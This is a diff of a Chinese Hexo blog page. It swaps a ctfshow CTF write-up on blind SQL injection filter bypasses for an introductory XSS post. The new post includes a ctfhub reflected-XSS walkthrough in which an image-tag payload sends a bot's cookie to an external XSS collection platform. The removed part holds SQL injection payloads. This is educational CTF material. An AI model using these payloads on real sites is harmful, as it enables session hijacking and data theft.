@@ -9,7 +9,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    ctfshow刷题记录 |  一段崎岖的旅行
+    xss |  一段崎岖的旅行
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -55,7 +55,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ctfshow刷题记录"
+  id="post-xss"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -66,22 +66,22 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  ctfshow刷题记录
+  xss
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2020/11/15/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-date">
-  <time datetime="2020-11-15T03:45:14.671Z" itemprop="datePublished">2020-11-15</time>
+      <a href="/2020/11/23/xss/" class="article-date">
+  <time datetime="2020-11-23T13:59:21.534Z" itemprop="datePublished">2020-11-23</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">403</span>
+            <span class="post-count">630</span>
         </span>
     </span>
 
@@ -90,7 +90,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">2 min</span>
         </span>
     </span>
 </div>
@@ -105,28 +105,27 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="web入门180："><a href="#web入门180：" class="headerlink" title="web入门180："></a>web入门180：</h2><p>这处过滤了#，/**/，%00，%a0,– ,空格，</p>
-<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master/IMG/20201115120454.png" alt="image-20201115120454526"></p>
-<p>注释都过滤了，还有空格。</p>
-<p>我们可以构造 a’or(id&gt;?)||’1’=’0  来达到目的。</p>
-<p>第一个引号闭合之前的，不能用空格就用(),其中||是或的意思，但是我查了好久，网上说是连接符。</p>
-<p>这样就可以达到闭合后面的   ‘  ,因为有limit 1所以要一个一个尝试，尝试一下23发现有flag.</p>
-<p>flag{1f9a4c19-c8ab-4319-923d-6febe6199368}</p>
-<h2 id="web入门181："><a href="#web入门181：" class="headerlink" title="web入门181："></a>web入门181：</h2><p>和180一样，</p>
-<h2 id="web入门182："><a href="#web入门182：" class="headerlink" title="web入门182："></a>web入门182：</h2><p>和180一样，</p>
-<h2 id="web入门183："><a href="#web入门183：" class="headerlink" title="web入门183："></a>web入门183：</h2><p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117120429.png" alt="image-20201117120422219"></p>
-<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117120511.png" alt="image-20201117120511404"></p>
-<p>不过你可以改43到127为flag的穷举形式，我难得改了。</p>
-<h2 id="web入门184："><a href="#web入门184：" class="headerlink" title="web入门184："></a>web入门184：</h2><p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117125358.png" alt="image-20201117125357965"></p>
-<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201117160637.png" alt="image-20201117160630571"></p>
-<p>构造playload：tableName=ctfshow_user a join ctfshow_user b on if(b.id&gt;23,if(a.id&gt;23,if(ascii(substr(b.pass,1,1))&gt;102,1,0),0),0)</p>
-<p>取别名a,b然后发现and or被禁用了，但是我们可以用if语句达到相同的效果。</p>
-<h2 id="web入门185"><a href="#web入门185" class="headerlink" title="web入门185:"></a>web入门185:</h2><p>他把数字禁掉了，就很过分。但是我们也有办法，就是用true和false代替，我不知道其他大佬是怎么写的，我感觉我的方法有一点low。把payload对应的数换成对应的true相加。</p>
-<h2 id="web入门186"><a href="#web入门186" class="headerlink" title="web入门186:"></a>web入门186:</h2><p>他把大于号，小于号禁用了，但是我们可以用round(x/2y)来判断x和y 是否相等，其实不用round也行，这个是四舍五入，于是人为的比较了大小。一下是payload</p>
-<p>payload = {‘tableName’: ‘’’ctfshow_user a join ctfshow_user b on if(round(b.id/%s),if(round(a.id/%s),if(round(ascii(substr(b.pass,%s,true))/%s),true,false),false),false)’’’ % (‘(‘+’true+’*44+’true)’,’(‘+’true+’*44+’true)’, ‘(‘+’true+’*(j-1)+’true)’, ‘(‘+’true+’*(2*i-1)+’true)’)}</p>
-<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201118201857.png" alt="image-20201118201850010"></p>
-<p>得到flag<img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201118202058.png" alt="image-20201118202058924"></p>
-<p>记得结果要i-1.</p>
+  <p>原理好像比较简单，用js来完成。</p>
+<p>直接上代码：</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201123220435.png" alt="image-20201123220428498"></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201123220757.png" alt="image-20201123220757457"></p>
+<p>当我们输入&lt;script&gt;alert(‘xss’)&lt;/script&gt;将会发生弹窗，这就是基本的原理。</p>
+<h4 id="ctfhub-xss-反射型："><a href="#ctfhub-xss-反射型：" class="headerlink" title="ctfhub xss 反射型："></a>ctfhub xss 反射型：</h4><p>目的 ：得到cookie</p>
+<p>得到题目：</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129005329.png" alt="XSS_Reflex1"></p>
+<!--sbfxf -->
+
+<p>注册一个xss平台 xss platform</p>
+<p><a href="https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=17294" target="_blank" rel="noopener">https://xss.pt/xss.php?do=project&amp;act=viewcode&amp;id=17294</a></p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129005647.png" alt="image-20201129005647719"></p>
+<p>在sent url to bot 构建 当前url+name=&lt;Img sRC=<a href="https://xss.pt/dQHWp.jpg&gt;" target="_blank" rel="noopener">https://xss.pt/dQHWp.jpg&gt;</a> 即可在平台得到接收内容。</p>
+<p><img src="https://raw.githubusercontent.com/rao2357/picgo/master//IMG/20201129011354.png" alt="image-20201129011354708"></p>
+<p>我们对xss已经有了简单的了解。</p>
+<p>xss分为简单的三种：</p>
+<h4 id="一、xss反射型原理："><a href="#一、xss反射型原理：" class="headerlink" title="一、xss反射型原理："></a>一、xss反射型原理：</h4><p>对普通的用户输入，页面原样输出，用户通过对JSCODE的伪装，经过一些操作就会跳出一个木马界面，取得登录用户的Cookie.</p>
+<p>比如说我建立了一个网站，还有一个其他人的网站有xss漏洞，在用户访问漏洞网站后，我就可以诱导用户去点击我的网站，我的网站就可以用javascript利用浏览器去访问漏洞网站，然后让其访问我的服务器，从而得到cookie。</p>
+<h4 id="二、存储型XSS："><a href="#二、存储型XSS：" class="headerlink" title="二、存储型XSS："></a>二、存储型XSS：</h4><p> &lt;持久化&gt;  代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<h4 id="三、跨站脚本漏洞测试流程"><a href="#三、跨站脚本漏洞测试流程" class="headerlink" title="三、跨站脚本漏洞测试流程"></a>三、跨站脚本漏洞测试流程</h4><p> 1.在目标站点上找到输入点，比如查询接口，留言板等<br> 2.输入一组”特殊字符+唯一识别字符”，点击提交后，查看返回源码，是否有做对应的处理。<br> 3.通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合)<br> 4.提交构造的脚本代码以及各种绕过姿势，看是否可以成功执行，如果成功执行则说明存在xss漏洞<br> Tips:<br> 1.一般查询接口容易出现反射型xss,留言板容易出现存储型xss<br> 2.由于后台可能存在过滤措施，构造的script可能会被过滤掉，而无法生效或者环境限制了执行。<br> 3.通过变化不同的script，尝试绕过后台过滤机制。</p>
  
       <!-- reward -->
       
@@ -193,7 +192,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/11/15/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/11/23/xss/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -204,19 +203,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/11/23/xss/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            xss
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/11/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-nav-link">
+      <a href="/2020/11/15/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">命令执行</div>
+        <div class="article-nav-title">ctfshow刷题记录</div>
       </a>
     
   </nav>
